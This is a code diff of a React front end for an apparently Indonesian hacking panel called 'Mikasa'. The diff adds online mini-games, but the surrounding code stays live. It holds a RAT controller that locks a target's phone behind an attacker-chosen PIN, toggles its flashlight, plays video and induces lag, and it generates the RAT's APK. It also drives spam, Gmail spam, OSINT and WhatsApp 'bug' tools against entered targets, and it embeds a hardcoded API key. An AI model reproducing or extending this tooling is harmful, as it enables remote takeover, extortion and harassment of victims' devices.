@@ -10,10 +10,14 @@ import {
   Loader2, LogOut, Settings, Camera,
   Clock, Shield, Phone, Link, Mail, MapPin,
   CreditCard, Smartphone, Server, Flame, School, Ban, UserSearch,
-  Database, Fingerprint, Cpu, Lightbulb, Video, AlertTriangle
+  Database, Fingerprint, Cpu, Lightbulb, Video, AlertTriangle,
+  Swords, UserPlus, Timer
 } from "lucide-react";
 
-import { GameCatur, GameUno, GameUlarTangga, GameSpy, GameTicTacToe } from "./gameEngine";
+import {
+  GameCatur, GameUno, GameUlarTangga, GameSpy, GameTicTacToe,
+  unoInit, ularInit, tttInit
+} from "./gameEngine";
 
 const API_URL = "https://api-mikasacloud.my.id";
 const API_KEY = "rahasia_banget_123";
@@ -82,16 +86,20 @@ const ALL_TOOLS = [
 
 const CATEGORIES = ["Semua", "Spam", "OSINT", "BugWA", "Download", "Utility"];
 
+const GAMES = [
+  { id: "catur", title: "Catur", icon: <Crown size={24} className="text-zinc-300" />, desc: "Strategi klasik" },
+  { id: "uno", title: "Uno", icon: <CircleDollarSign size={24} className="text-red-400" />, desc: "Kartu warna" },
+  { id: "tictactoe", title: "Tic Tac Toe", icon: <Grid3X3 size={24} className="text-green-400" />, desc: "Bo10 seru" },
+  { id: "ular", title: "Ular Tangga", icon: <Dices size={24} className="text-orange-400" />, desc: "Dadu & ular" },
+  { id: "spy", title: "Who's The Spy", icon: <Users size={24} className="text-purple-400" />, desc: "Tebak penyusup" },
+];
+
 function UserAvatar({ name, avatarMap = {}, size = 14, border = "border-zinc-600" }) {
   const [b64, setB64] = useState("");
   useEffect(() => {
-    if (avatarMap[name]) {
-      setB64(avatarMap[name]);
-    } else {
-      setB64(getAvatarFor(name));
-    }
+    if (avatarMap[name]) setB64(avatarMap[name]);
+    else setB64(getAvatarFor(name));
   }, [name, avatarMap]);
-
   const src = b64 || `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(name)}&backgroundColor=1a1a24`;
   const px = size * 4;
   return (
@@ -103,14 +111,11 @@ function UserAvatar({ name, avatarMap = {}, size = 14, border = "border-zinc-600
 
 function timeFmt(ts) {
   if (!ts) return "";
-  const d = new Date(ts);
-  return d.toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" });
+  return new Date(ts).toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" });
 }
-
 function dateFmt(ts) {
   if (!ts) return "";
-  const d = new Date(ts);
-  return d.toLocaleDateString("id-ID", { day: "2-digit", month: "short", year: "numeric" });
+  return new Date(ts).toLocaleDateString("id-ID", { day: "2-digit", month: "short", year: "numeric" });
 }
 
 export default function Home() {
@@ -152,7 +157,6 @@ export default function Home() {
 
   const [toolCategory, setToolCategory] = useState("Semua");
   const [activeTool, setActiveTool] = useState(null);
-
   const [toolTarget, setToolTarget] = useState("");
   const [toolResult, setToolResult] = useState(null);
   const [toolLoading, setToolLoading] = useState(false);
@@ -164,6 +168,14 @@ export default function Home() {
   const [senderLoading, setSenderLoading] = useState(false);
 
   const [activeGame, setActiveGame] = useState(null);
+  const [gameMode, setGameMode] = useState(null);
+  const [gameState, setGameState] = useState(null);
+  const [gameRoomId, setGameRoomId] = useState(null);
+  const [gameOpponent, setGameOpponent] = useState(null);
+  const [gameMyColor, setGameMyColor] = useState(null);
+  const [gameLevel, setGameLevel] = useState("medium");
+  const [isQueueing, setIsQueueing] = useState(false);
+  const [gameMessage, setGameMessage] = useState("");
 
   const [musicSearch, setMusicSearch] = useState("");
   const [musicResults, setMusicResults] = useState([]);
@@ -172,12 +184,7 @@ export default function Home() {
   const [isPlaying, setIsPlaying] = useState(false);
 
   const [ratTargetId, setRatTargetId] = useState("");
-  const [ratStates, setRatStates] = useState({
-    flashlight: false,
-    lock: false,
-    video: false,
-    lag: false
-  });
+  const [ratStates, setRatStates] = useState({ flashlight: false, lock: false, video: false, lag: false });
   const [ratLoading, setRatLoading] = useState(false);
   const [ratSocket, setRatSocket] = useState(null);
   const [isGenerating, setIsGenerating] = useState(false);
@@ -232,11 +239,7 @@ export default function Home() {
         const role = validUser.role ? validUser.role.toUpperCase() : "FREE";
         setUserRole(role);
         const persistedAvatar = getAvatarFor(username);
-        const profile = {
-          name: username,
-          avatar: persistedAvatar || "",
-          expired: "2054-02-25"
-        };
+        const profile = { name: username, avatar: persistedAvatar || "", expired: "2054-02-25" };
         setUserProfile(profile);
         localStorage.setItem("mikasa_user", JSON.stringify({ username, role, profile }));
         setShowIntro(true);
@@ -258,7 +261,6 @@ export default function Home() {
   const handleFingerprintTap = () => {
     if (isScanning) return;
     setIsScanning(true);
-
     setTimeout(() => {
       startBGM();
       setShowTapToPlay(false);
@@ -290,10 +292,7 @@ export default function Home() {
 
       newSocket.on('update_online_users', (users) => setOnlineUsers(users.filter(u => u !== username)));
 
-      newSocket.on('avatar_snapshot', (snapshot) => {
-        setServerAvatars(snapshot || {});
-      });
-
+      newSocket.on('avatar_snapshot', (snapshot) => setServerAvatars(snapshot || {}));
       newSocket.on('avatar_update', ({ username: uname, avatar }) => {
         setServerAvatars((prev) => {
           const copy = { ...prev };
@@ -303,18 +302,11 @@ export default function Home() {
         });
       });
 
-      newSocket.on('chat_history_global', (history) => {
-        setGlobalMsgs(history || []);
-      });
-
-      newSocket.on('receive_global_msg', (data) => {
-        setGlobalMsgs((prev) => [...prev, data]);
-      });
+      newSocket.on('chat_history_global', (history) => setGlobalMsgs(history || []));
+      newSocket.on('receive_global_msg', (data) => setGlobalMsgs((prev) => [...prev, data]));
 
       newSocket.on('chat_history_private', ({ with: withUser, messages }) => {
-        if (withUser === chatTarget) {
-          setPrivateMsgs(messages || []);
-        }
+        if (withUser === chatTarget) setPrivateMsgs(messages || []);
       });
 
       newSocket.on('receive_private_msg', (data) => {
@@ -334,9 +326,42 @@ export default function Home() {
       });
 
       newSocket.on('unread_update', (snapshot) => {
-        if (snapshot && typeof snapshot[username] === "number") {
-          setUnreadTotal(snapshot[username]);
-        }
+        if (snapshot && typeof snapshot[username] === "number") setUnreadTotal(snapshot[username]);
+      });
+
+      newSocket.on('game_queue_joined', ({ game }) => {
+        setIsQueueing(true);
+        setGameMessage(`Menunggu lawan ${game}...`);
+      });
+
+      newSocket.on('game_matched', ({ roomId, game, opponent, myColor, opponentColor }) => {
+        setIsQueueing(false);
+        setGameRoomId(roomId);
+        setGameOpponent(opponent);
+        setGameMyColor(myColor);
+        setGameMessage("");
+        let init = null;
+        if (game === 'uno') init = unoInit();
+        else if (game === 'ular') init = ularInit();
+        else if (game === 'tictactoe') init = tttInit();
+        setGameState(init);
+        setGameMode('pvp');
+      });
+
+      newSocket.on('game_opponent_move', ({ move }) => {
+        setGameState((prev) => {
+          if (!prev) return prev;
+          if (prev.board && Array.isArray(prev.board)) {
+            return { ...prev, ...move };
+          }
+          return { ...prev, ...move };
+        });
+      });
+
+      newSocket.on('game_opponent_left', () => {
+        setGameMessage("Lawan keluar dari room");
+        setGameRoomId(null);
+        setGameOpponent(null);
       });
 
       const s = io(API_URL, { transports: ["websocket"] });
@@ -364,8 +389,7 @@ export default function Home() {
   const sendPrivateMsg = (e) => {
     e.preventDefault();
     if (!msgInput.trim() || !socket || !chatTarget) return;
-    const data = { from: username, to: chatTarget, msg: msgInput };
-    socket.emit('send_private_msg', data);
+    socket.emit('send_private_msg', { from: username, to: chatTarget, msg: msgInput });
     setMsgInput("");
   };
 
@@ -399,6 +423,57 @@ export default function Home() {
     });
   };
 
+  const startNpcGame = (gameId) => {
+    setActiveGame(gameId);
+    setGameMode('npc');
+    setGameState(null);
+    setGameRoomId(null);
+    setGameOpponent(null);
+    setGameMyColor(gameId === 'catur' ? 'w' : gameId === 'tictactoe' ? 'X' : 0);
+    setGameMessage("");
+  };
+
+  const startQueue = (gameId) => {
+    if (!socket) return;
+    setActiveGame(gameId);
+    setGameMode('pvp');
+    setGameState(null);
+    setGameRoomId(null);
+    setGameOpponent(null);
+    setGameMessage("Menghubungkan ke server...");
+    socket.emit('game_join_queue', { game: gameId, username });
+  };
+
+  const leaveQueue = () => {
+    if (socket && activeGame) {
+      socket.emit('game_leave_queue', { game: activeGame });
+    }
+    setIsQueueing(false);
+    setGameMessage("");
+  };
+
+  const exitGame = () => {
+    if (socket && gameRoomId) {
+      socket.emit('game_leave', { roomId: gameRoomId });
+    }
+    if (socket && activeGame) {
+      socket.emit('game_leave_queue', { game: activeGame });
+    }
+    setActiveGame(null);
+    setGameMode(null);
+    setGameState(null);
+    setGameRoomId(null);
+    setGameOpponent(null);
+    setIsQueueing(false);
+    setGameMessage("");
+  };
+
+  const handleGameMove = (move) => {
+    if (gameMode === 'pvp' && socket && gameRoomId) {
+      socket.emit('game_move', { roomId: gameRoomId, username, move });
+    }
+  };
+
   const handleSearchMusic = async (e) => {
     if (e) e.preventDefault();
     if (!musicSearch.trim()) return;
@@ -407,23 +482,15 @@ export default function Home() {
       const res = await fetch(`https://itunes.apple.com/search?term=${encodeURIComponent(musicSearch)}&media=music&limit=25`);
       const data = await res.json();
       setMusicResults(data.results || []);
-    } catch (err) {
-      console.error(err);
-    } finally {
-      setLoadingMusic(false);
-    }
+    } catch (err) { console.error(err); }
+    finally { setLoadingMusic(false); }
   };
 
   const togglePlay = (e) => {
     if (e) e.stopPropagation();
     if (!globalAudio) return;
-    if (isPlaying) {
-      globalAudio.pause();
-      setIsPlaying(false);
-    } else {
-      globalAudio.play();
-      setIsPlaying(true);
-    }
+    if (isPlaying) { globalAudio.pause(); setIsPlaying(false); }
+    else { globalAudio.play(); setIsPlaying(true); }
   };
 
   const playMusic = (track) => {
@@ -447,7 +514,6 @@ export default function Home() {
     localStorage.setItem("mikasa_user", JSON.stringify(savedUser));
     setUserProfile(updatedProfile);
     setShowProfileModal(false);
-
     if (socket && socket.connected) {
       socket.emit('update_avatar', { username, avatar: userProfile.avatar });
     }
@@ -482,9 +548,7 @@ export default function Home() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ ownerId: username })
       });
-
       if (!response.ok) throw new Error("Gagal download");
-
       const blob = await response.blob();
       const url = window.URL.createObjectURL(blob);
       const a = document.createElement('a');
@@ -493,48 +557,28 @@ export default function Home() {
       document.body.appendChild(a);
       a.click();
       a.remove();
-    } catch (err) {
-      alert("Terjadi kesalahan saat generate APK. Cek koneksi atau server Pterodactyl.");
-    } finally {
-      setIsGenerating(false);
-    }
+    } catch (err) { alert("Terjadi kesalahan saat generate APK."); }
+    finally { setIsGenerating(false); }
   };
 
   const claimDevice = (deviceId) => {
     if (!ratSocket) return;
-    ratSocket.emit("rat_claim_device", {
-      deviceId: deviceId,
-      ownerId: username
-    });
+    ratSocket.emit("rat_claim_device", { deviceId, ownerId: username });
   };
 
   const toggleRat = async (key, pin = null) => {
     if (!ratTargetId) return alert("Pilih target dulu bre!");
-    if (!ratSocket || !ratSocket.connected) return alert("Socket RAT belum terhubung ke server!");
-
-    if (key === 'lock' && !ratStates.lock && !pin) {
-      setShowPinModal(true);
-      return;
-    }
-
+    if (!ratSocket || !ratSocket.connected) return alert("Socket RAT belum terhubung!");
+    if (key === 'lock' && !ratStates.lock && !pin) { setShowPinModal(true); return; }
     const newState = !ratStates[key];
     setRatStates(prev => ({ ...prev, [key]: newState }));
-
     let command = "";
     if (key === 'flashlight') command = newState ? "flashlight_on" : "flashlight_off";
     if (key === 'lock') command = newState ? "lock" : "unlock";
     if (key === 'video') command = newState ? "play_video" : "stop_video";
     if (key === 'lag') command = newState ? "lag_on" : "lag_off";
-
     setRatLoading(true);
-
-    ratSocket.emit("rat_command", {
-      deviceId: ratTargetId,
-      command: command,
-      ownerId: username,
-      pin: pin
-    });
-
+    ratSocket.emit("rat_command", { deviceId: ratTargetId, command, ownerId: username, pin });
     setTimeout(() => setRatLoading(false), 1000);
   };
 
@@ -548,20 +592,14 @@ export default function Home() {
     if (!activeTool || !toolTarget) return;
     setToolLoading(true);
     setToolResult(null);
-
     let payloadBody = {};
     if (activeTool.extra) Object.assign(payloadBody, activeTool.extra);
     payloadBody[activeTool.payload] = toolTarget;
-
-    if (activeTool.endpoint === "/api/bug-wa") {
-      payloadBody.senderId = username;
-    }
-
+    if (activeTool.endpoint === "/api/bug-wa") payloadBody.senderId = username;
     if (activeTool.id === 'spamgmail') {
-        payloadBody.email = toolTarget;
-        payloadBody.message = "Pesan spam dari Mikasa Web";
+      payloadBody.email = toolTarget;
+      payloadBody.message = "Pesan spam dari Mikasa Web";
     }
-
     try {
       const res = await fetch(`${API_URL}${activeTool.endpoint}`, {
         method: "POST",
@@ -571,10 +609,8 @@ export default function Home() {
       const data = await res.json();
       setToolResult(data);
     } catch (err) {
-      setToolResult({ status: false, error: "Gagal terhubung ke API. Cek Tunnel Pterodactyl lu." });
-    } finally {
-      setToolLoading(false);
-    }
+      setToolResult({ status: false, error: "Gagal terhubung ke API." });
+    } finally { setToolLoading(false); }
   };
 
   const handleSenderPairing = async () => {
@@ -588,41 +624,26 @@ export default function Home() {
         body: JSON.stringify({ nomor: senderNumber, userId: username })
       });
       const data = await res.json();
-      if(data.code) {
-         setSenderCode(data.code);
-         setSenderActive(true);
-      } else {
-         alert(data.error || "Gagal dapet kode pairing");
-      }
-    } catch (err) {
-      alert("Gagal konek ke server Pterodactyl.");
-    } finally {
-      setSenderLoading(false);
-    }
+      if(data.code) { setSenderCode(data.code); setSenderActive(true); }
+      else { alert(data.error || "Gagal dapet kode pairing"); }
+    } catch (err) { alert("Gagal konek ke server."); }
+    finally { setSenderLoading(false); }
   };
 
   const renderToolResult = (data) => {
     if (!data) return null;
-
     const renderValue = (val) => {
       if (val === null) return <span className="text-zinc-500 italic">null</span>;
       if (typeof val === 'boolean') return <span className={val ? "text-green-400" : "text-red-400"}>{val.toString()}</span>;
       if (typeof val === 'string' || typeof val === 'number') return <span className="text-white break-words">{val.toString()}</span>;
-
       if (Array.isArray(val)) {
         if (val.length === 0) return <span className="text-zinc-500 italic">Kosong</span>;
         return (
           <div className="pl-3 border-l border-zinc-700 mt-1 space-y-2">
-            {val.map((item, i) => (
-              <div key={i} className="text-xs">
-                <span className="text-zinc-500 mr-2">#{i + 1}</span>
-                {renderValue(item)}
-              </div>
-            ))}
+            {val.map((item, i) => (<div key={i} className="text-xs"><span className="text-zinc-500 mr-2">#{i + 1}</span>{renderValue(item)}</div>))}
           </div>
         );
       }
-
       if (typeof val === 'object') {
         return (
           <div className="pl-3 border-l border-zinc-700 mt-1 space-y-1">
@@ -637,22 +658,16 @@ export default function Home() {
       }
       return null;
     };
-
     return (
       <div className="mt-4 bg-[#16111e] border border-zinc-700 rounded-xl p-4 overflow-hidden">
-        <h4 className="text-white font-bold text-sm mb-3 flex items-center gap-2 border-b border-zinc-700 pb-2">
-          <CheckCircle2 size={16} className="text-green-500" /> Hasil Eksekusi
-        </h4>
+        <h4 className="text-white font-bold text-sm mb-3 flex items-center gap-2 border-b border-zinc-700 pb-2"><CheckCircle2 size={16} className="text-green-500" /> Hasil Eksekusi</h4>
         <div className="space-y-2">
            {Object.entries(data).map(([key, value]) => {
              if (key === 'status' && value === true) return null;
-
              return (
                <div key={key} className="flex flex-col">
                  <span className="text-zinc-400 text-xs font-bold capitalize mb-1">{key.replace(/_/g, ' ')}</span>
-                 <div className="bg-black/40 p-2 rounded-lg border border-zinc-800">
-                    {renderValue(value)}
-                 </div>
+                 <div className="bg-black/40 p-2 rounded-lg border border-zinc-800">{renderValue(value)}</div>
                </div>
              );
            })}
@@ -668,9 +683,7 @@ export default function Home() {
           <source src={INTRO_VIDEO} type="video/mp4" />
         </video>
         <audio autoPlay><source src={INTRO_AUDIO} type="audio/mpeg" /></audio>
-        <button onClick={handleSkipIntro} className="absolute top-6 right-6 bg-transparent border border-white/50 text-white px-5 py-2 rounded-full text-sm font-bold z-50 hover:bg-white/20 transition-all">
-          Skip ➔
-        </button>
+        <button onClick={handleSkipIntro} className="absolute top-6 right-6 bg-transparent border border-white/50 text-white px-5 py-2 rounded-full text-sm font-bold z-50 hover:bg-white/20 transition-all">Skip ➔</button>
       </div>
     );
   }
@@ -707,12 +720,9 @@ export default function Home() {
     return (
       <div className="min-h-screen bg-[#0f0a15] text-zinc-300 font-sans pb-24">
         <header className="p-4 flex items-center justify-between sticky top-0 bg-[#0f0a15]/90 backdrop-blur-md z-30 border-b border-zinc-800">
-          <button onClick={() => { setActiveTool(null); setToolTarget(""); setToolResult(null); }} className="text-white p-2">
-            <ChevronLeft size={24} />
-          </button>
+          <button onClick={() => { setActiveTool(null); setToolTarget(""); setToolResult(null); }} className="text-white p-2"><ChevronLeft size={24} /></button>
           <h1 className="text-white font-semibold text-lg capitalize flex-1 ml-2">{activeTool.name}</h1>
         </header>
-
         <main className="px-4 max-w-md mx-auto mt-2 space-y-4">
           <div className="bg-gradient-to-br from-zinc-800 to-zinc-900 border border-zinc-700 rounded-3xl p-6 relative overflow-hidden shadow-2xl">
             <div className="absolute top-0 right-0 w-32 h-32 bg-zinc-600/20 blur-3xl rounded-full"></div>
@@ -720,9 +730,7 @@ export default function Home() {
               <div>
                 <h2 className="text-white text-2xl font-bold leading-tight mb-2">{activeTool.name}</h2>
                 <div className="flex gap-2">
-                  <div className="flex items-center gap-1 bg-zinc-800/80 border border-zinc-700 px-3 py-1.5 rounded-lg text-xs text-zinc-300">
-                    <Shield size={12} /> {userRole}
-                  </div>
+                  <div className="flex items-center gap-1 bg-zinc-800/80 border border-zinc-700 px-3 py-1.5 rounded-lg text-xs text-zinc-300"><Shield size={12} /> {userRole}</div>
                 </div>
               </div>
               <div className="flex flex-col items-center justify-center w-24 h-24 rounded-full border-2 border-zinc-600 bg-zinc-800/50 shadow-inner">
@@ -731,44 +739,21 @@ export default function Home() {
               </div>
             </div>
           </div>
-
           <div className="grid grid-cols-3 gap-2">
-            <button onClick={() => { setChatMode("global"); setActiveTab("chat"); setActiveTool(null); }} className="bg-blue-600 hover:bg-blue-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-blue-900/20">
-              <MessageSquare size={20} className="text-white" />
-              <span className="text-white text-xs font-bold">Global Chat</span>
-            </button>
-            <button onClick={() => { setActiveTool(null); setToolTarget(""); setToolResult(null); }} className="bg-zinc-700 hover:bg-zinc-600 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-zinc-900/20">
-              <ChevronLeft size={20} className="text-white" />
-              <span className="text-white text-xs font-bold">Kembali</span>
-            </button>
-            <a href="https://wa.me/6283832110509" target="_blank" rel="noopener noreferrer" className="bg-emerald-600 hover:bg-emerald-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-emerald-900/20">
-              <Phone size={20} className="text-white" />
-              <span className="text-white text-xs font-bold">Developer</span>
-            </a>
+            <button onClick={() => { setChatMode("global"); setActiveTab("chat"); setActiveTool(null); }} className="bg-blue-600 hover:bg-blue-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-blue-900/20"><MessageSquare size={20} className="text-white" /><span className="text-white text-xs font-bold">Global Chat</span></button>
+            <button onClick={() => { setActiveTool(null); setToolTarget(""); setToolResult(null); }} className="bg-zinc-700 hover:bg-zinc-600 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-zinc-900/20"><ChevronLeft size={20} className="text-white" /><span className="text-white text-xs font-bold">Kembali</span></button>
+            <a href="https://wa.me/6283832110509" target="_blank" rel="noopener noreferrer" className="bg-emerald-600 hover:bg-emerald-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-emerald-900/20"><Phone size={20} className="text-white" /><span className="text-white text-xs font-bold">Developer</span></a>
           </div>
-
           <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
-            <h3 className="text-white font-bold text-sm mb-2 flex items-center gap-2">
-              <activeTool.icon size={16} className={activeTool.color} /> Info Fitur
-            </h3>
-            <p className="text-xs text-zinc-400 leading-relaxed">
-              {activeTool.desc}
-            </p>
+            <h3 className="text-white font-bold text-sm mb-2 flex items-center gap-2"><activeTool.icon size={16} className={activeTool.color} /> Info Fitur</h3>
+            <p className="text-xs text-zinc-400 leading-relaxed">{activeTool.desc}</p>
           </div>
-
           <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
             <label className="text-xs text-zinc-400 block mb-2">Target / Input</label>
-            <input
-              type="text"
-              value={toolTarget}
-              onChange={(e) => setToolTarget(e.target.value)}
-              className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white mb-4"
-              placeholder={activeTool.placeholder || "Masukkan target..."}
-            />
+            <input type="text" value={toolTarget} onChange={(e) => setToolTarget(e.target.value)} className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white mb-4" placeholder={activeTool.placeholder || "Masukkan target..."} />
             <button onClick={executeTool} disabled={toolLoading} className="w-full bg-zinc-600 text-white font-bold py-3 rounded-lg flex justify-center items-center">
               {toolLoading ? <Loader2 className="animate-spin" size={20}/> : "Eksekusi"}
             </button>
-
             {toolResult && renderToolResult(toolResult)}
           </div>
         </main>
@@ -856,63 +841,131 @@ export default function Home() {
         <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl w-full max-w-sm p-6 relative">
           <button onClick={() => setShowPinModal(false)} className="absolute top-4 right-4 text-zinc-400"><X size={20}/></button>
           <h2 className="text-white font-bold text-lg mb-2">Kunci HP Target</h2>
-          <p className="text-xs text-zinc-400 mb-4">Masukkan PIN rahasia. Target harus memasukkan PIN ini untuk membuka HP mereka.</p>
+          <p className="text-xs text-zinc-400 mb-4">Masukkan PIN rahasia. Target harus memasukkan PIN ini untuk membuka HP.</p>
           <div className="space-y-4">
             <div>
               <label className="text-xs text-zinc-400 block mb-1">PIN Rahasia</label>
-              <input
-                type="text"
-                value={lockPin}
-                onChange={(e) => setLockPin(e.target.value.replace(/\D/g, ''))}
-                className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white text-center text-xl tracking-widest"
-                placeholder="Contoh: 123456"
-                maxLength={8}
-              />
+              <input type="text" value={lockPin} onChange={(e) => setLockPin(e.target.value.replace(/\D/g, ''))} className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-3 text-white text-center text-xl tracking-widest" placeholder="Contoh: 123456" maxLength={8} />
             </div>
-            <button onClick={submitLock} className="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-3 rounded-lg flex justify-center items-center transition-colors">
-              <Lock size={20} className="mr-2" /> Kunci Sekarang!
-            </button>
+            <button onClick={submitLock} className="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-3 rounded-lg flex justify-center items-center transition-colors"><Lock size={20} className="mr-2" /> Kunci Sekarang!</button>
           </div>
         </div>
       </div>
     );
   };
 
+  if (activeGame) {
+    const gameObj = GAMES.find(g => g.id === activeGame);
+    const inLobby = gameMode === null;
+    const inQueue = isQueueing;
+
+    return (
+      <div className="min-h-screen bg-[#0f0a15] text-zinc-300 font-sans flex flex-col">
+        <header className="p-4 flex items-center justify-between sticky top-0 bg-[#0f0a15]/90 backdrop-blur-md z-30 border-b border-zinc-800 shrink-0">
+          <button onClick={exitGame} className="text-white p-2"><ChevronLeft size={24} /></button>
+          <h1 className="text-white font-semibold text-lg capitalize flex-1 ml-2">{gameObj?.title}</h1>
+          {gameMode === 'pvp' && gameOpponent && (
+            <span className="text-xs text-emerald-400 bg-emerald-900/30 border border-emerald-700 px-2 py-1 rounded-lg">
+              vs {gameOpponent}
+            </span>
+          )}
+        </header>
+
+        <main className="flex-1 px-4 py-4 max-w-md mx-auto w-full">
+          {inLobby && (
+            <div className="space-y-4">
+              <div className="bg-gradient-to-br from-zinc-800 to-zinc-900 border border-zinc-700 rounded-3xl p-6 text-center">
+                <div className="w-16 h-16 mx-auto bg-[#0f0a15] rounded-2xl flex items-center justify-center mb-3">{gameObj?.icon}</div>
+                <h2 className="text-white text-2xl font-bold">{gameObj?.title}</h2>
+                <p className="text-xs text-zinc-400 mt-1">{gameObj?.desc}</p>
+              </div>
+
+              <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
+                <h3 className="text-white font-bold text-sm mb-3">Pilih Level (vs NPC)</h3>
+                <div className="grid grid-cols-3 gap-2 mb-3">
+                  {['easy', 'medium', 'hard'].map(lvl => (
+                    <button key={lvl} onClick={() => setGameLevel(lvl)} className={`py-2 rounded-lg text-xs font-bold capitalize ${gameLevel === lvl ? 'bg-zinc-600 text-white' : 'bg-zinc-800 text-zinc-400 border border-zinc-700'}`}>{lvl}</button>
+                  ))}
+                </div>
+                <button onClick={() => startNpcGame(activeGame)} className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2">
+                  <Gamepad2 size={18} /> Main vs NPC
+                </button>
+              </div>
+
+              <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
+                <h3 className="text-white font-bold text-sm mb-3 flex items-center gap-2"><Swords size={16} className="text-red-400" /> Multiplayer Online</h3>
+                <p className="text-xs text-zinc-400 mb-3">Cari lawan online dari pengguna lain yang sedang buka game ini.</p>
+                <button onClick={() => startQueue(activeGame)} className="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2">
+                  <Users size={18} /> Cari Lawan Online
+                </button>
+              </div>
+            </div>
+          )}
+
+          {inQueue && (
+            <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-6 text-center space-y-4 mt-6">
+              <div className="w-20 h-20 mx-auto rounded-full bg-blue-900/30 border border-blue-700 flex items-center justify-center">
+                <Loader2 size={36} className="animate-spin text-blue-400" />
+              </div>
+              <div>
+                <h2 className="text-white font-bold">Mencari Lawan...</h2>
+                <p className="text-xs text-zinc-400 mt-1">{gameMessage}</p>
+              </div>
+              <button onClick={leaveQueue} className="w-full bg-zinc-700 hover:bg-zinc-600 text-white font-bold py-3 rounded-lg">Batal</button>
+            </div>
+          )}
+
+          {gameMode === 'npc' && !inQueue && (
+            <div className="bg-[#0f0a15] rounded-2xl">
+              {activeGame === 'catur' && <GameCatur level={gameLevel} mode="npc" myColor="w" onClose={exitGame} onMove={handleGameMove} />}
+              {activeGame === 'uno' && <GameUno mode="npc" mySeat={0} onClose={exitGame} onMove={handleGameMove} />}
+              {activeGame === 'ular' && <GameUlarTangga mode="npc" mySeat={0} onClose={exitGame} onMove={handleGameMove} />}
+              {activeGame === 'spy' && <GameSpy mode="npc" onClose={exitGame} onMove={handleGameMove} />}
+              {activeGame === 'tictactoe' && <GameTicTacToe level={gameLevel} mode="npc" myMark="X" onClose={exitGame} onMove={handleGameMove} />}
+            </div>
+          )}
+
+          {gameMode === 'pvp' && !inQueue && !gameRoomId && (
+            <div className="text-center py-10">
+              <Loader2 size={32} className="animate-spin text-zinc-500 mx-auto mb-3" />
+              <p className="text-zinc-500 text-sm">{gameMessage || "Menunggu match..."}</p>
+              <button onClick={exitGame} className="mt-4 bg-zinc-700 text-white px-4 py-2 rounded-lg text-sm">Batal</button>
+            </div>
+          )}
+
+          {gameMode === 'pvp' && gameRoomId && (
+            <div className="bg-[#0f0a15] rounded-2xl">
+              {gameMessage && (
+                <div className="bg-red-900/30 border border-red-700 text-red-300 text-xs p-2 rounded-lg mb-3 text-center">{gameMessage}</div>
+              )}
+              {activeGame === 'catur' && <GameCatur mode="pvp" myColor={gameMyColor} opponentName={gameOpponent} serverFen={gameState?.fen || null} onMove={handleGameMove} onClose={exitGame} />}
+              {activeGame === 'uno' && <GameUno mode="pvp" mySeat={gameMyColor} serverState={gameState} opponentName={gameOpponent} onMove={handleGameMove} onClose={exitGame} />}
+              {activeGame === 'ular' && <GameUlarTangga mode="pvp" mySeat={gameMyColor} serverState={gameState} onMove={handleGameMove} onClose={exitGame} />}
+              {activeGame === 'spy' && <GameSpy mode="pvp" serverState={gameState} onMove={handleGameMove} onClose={exitGame} />}
+              {activeGame === 'tictactoe' && <GameTicTacToe mode="pvp" myMark={gameMyColor} serverState={gameState} opponentName={gameOpponent} onMove={handleGameMove} onClose={exitGame} />}
+            </div>
+          )}
+        </main>
+      </div>
+    );
+  }
+
   return (
     <div className="min-h-screen bg-[#0f0a15] text-zinc-300 font-sans pb-24">
-
       {showTapToPlay && (
-        <div
-          onClick={handleFingerprintTap}
-          className="fixed inset-0 bg-black/95 z-[999] flex flex-col items-center justify-center cursor-pointer transition-opacity duration-500"
-        >
+        <div onClick={handleFingerprintTap} className="fixed inset-0 bg-black/95 z-[999] flex flex-col items-center justify-center cursor-pointer transition-opacity duration-500">
           <div className={`relative flex items-center justify-center w-32 h-32 rounded-full border-2 transition-all duration-300 ${isScanning ? 'border-green-500 shadow-[0_0_30px_rgba(34,197,94,0.5)]' : 'border-zinc-600'}`}>
-             <Fingerprint
-                size={64}
-                className={`transition-colors duration-300 ${isScanning ? 'text-green-500' : 'text-zinc-400'}`}
-             />
-             {isScanning && (
-                <div className="absolute inset-0 flex items-center justify-center bg-black/60 rounded-full backdrop-blur-sm">
-                   <CheckCircle2 size={64} className="text-green-500 animate-in zoom-in spin-in-12 duration-500" />
-                </div>
-             )}
+             <Fingerprint size={64} className={`transition-colors duration-300 ${isScanning ? 'text-green-500' : 'text-zinc-400'}`} />
+             {isScanning && (<div className="absolute inset-0 flex items-center justify-center bg-black/60 rounded-full backdrop-blur-sm"><CheckCircle2 size={64} className="text-green-500 animate-in zoom-in spin-in-12 duration-500" /></div>)}
           </div>
-          <h2 className={`text-white text-xl font-bold mt-8 transition-colors duration-300 ${isScanning ? 'text-green-400' : 'text-white'}`}>
-            {isScanning ? "Autentikasi Berhasil" : "Sentuh Sidik Jari"}
-          </h2>
-          <p className="text-zinc-500 text-sm mt-2">
